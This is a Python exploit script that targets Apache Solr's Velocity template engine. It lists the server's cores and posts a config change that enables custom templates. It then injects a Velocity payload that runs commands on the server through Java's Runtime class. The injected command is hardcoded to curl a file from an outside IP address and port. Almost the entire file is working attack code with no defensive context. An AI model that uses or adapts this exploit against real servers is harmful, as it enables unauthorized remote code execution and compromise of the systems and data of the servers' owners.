# -*- coding: utf-8 -*-
import requests
import json
import sys
from urllib import quote_plus
def main(url, cmd):
# def main(url):
    core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'
    r = requests.get(url=core_selector_url)
    json_strs = json.loads(r.text)
    if r.status_code == 200 and "responseHeader" in r.text:
        list = []
        for core_selector in json_strs['status']:
            list.append(json_strs['status']['%s' % core_selector]['name'])
        jas502n_Core_Name = list[0]
    newurl = url + '/solr/' + jas502n_Core_Name + '/config'
    modifyConfig_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                            "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close",
                            "Content-Type": "application/json"}
    modifyConfig_json = {
        "update-queryresponsewriter": {"startup": "lazy", "name": "velocity",
                                       "class": "solr.VelocityResponseWriter",
                                       "template.base.dir": "", "solr.resource.loader.enabled": "true",
                                       "params.resource.loader.enabled": "true"}}
    #data=json.dumps(payload)
    res = requests.post(newurl, headers=modifyConfig_headers,json=modifyConfig_json)
    cmd = quote_plus(cmd)
    if res.status_code == 200 or 500:
        try:
            p = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName('java.lang.String'))+%23set($ex=$rt.getRuntime().exec('curl 173.82.250.86:10000/111111i.jsp'))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format(
                cmd)
            target = url + '/solr/' + jas502n_Core_Name + p
            print u'命令执行url：'
            print target
            result = requests.get(url=target)
            if result.status_code == 200 and len(result.text) < 65:
                print u'命令执行结果：'
                print result.content
        except Exception as e:
            print
            'failed'
if __name__ == '__main__':
    print
    main(sys.argv[1], sys.argv[2])